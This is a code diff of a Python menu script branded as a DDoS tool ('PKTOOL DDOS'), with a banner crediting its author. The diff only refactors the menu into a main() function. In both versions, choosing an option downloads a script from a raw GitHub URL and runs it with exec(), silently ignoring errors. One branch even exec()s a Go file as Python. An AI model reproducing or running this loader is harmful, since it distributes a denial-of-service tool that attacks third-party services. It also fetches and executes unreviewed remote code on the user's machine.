@@ -29,8 +29,8 @@ def banner():
        ║          Nguyễn Trương Thiện Phát                   ║
        ║         facebook.com/100047128875560                ║
        ╚═════════════════════════════════════════════════════╝
-
 ''')
+    
 def dk():
     a = "\033[1;91m=\033[1;97m=" * 30
     for i in range(len(a)):
@@ -68,23 +68,27 @@ def ra(a):
         sys.stdout.flush()
     print()
 
-dk()
-from pystyle import Box
-os.system('clear')
-banner()
-dk()
-print("- - - - - - - - - - - PKDDOS NTTP - - - - - - - - - - - - -")
-print()
-print(sr+"Nhập [1] PKTOOL DDOS")
-print()
-dk()
-abc = int(input(sr+"Nhập Số : "))
-dk()
+def main():
+    dk()
+    from pystyle import Box
+    os.system('clear')
+    banner()
+    dk()
+    print("- - - - - - - - - - - PKDDOS NTTP - - - - - - - - - - - - -")
+    print()
+    print(sr+"Nhập [1] PKTOOL DDOS")
+    print()
+    dk()
+    abc = int(input(sr+"Nhập Số : "))
+    dk()
 
-try:
-    if abc == 1:
-        exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py").text)
-    if abc == 2:
-        exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)
-except:
-    pass
+    try:
+        if abc == 1:
+            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py").text)
+        elif abc == 2:
+            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)
+    except:
+        pass
+
+if __name__ == "__main__":
+    main()
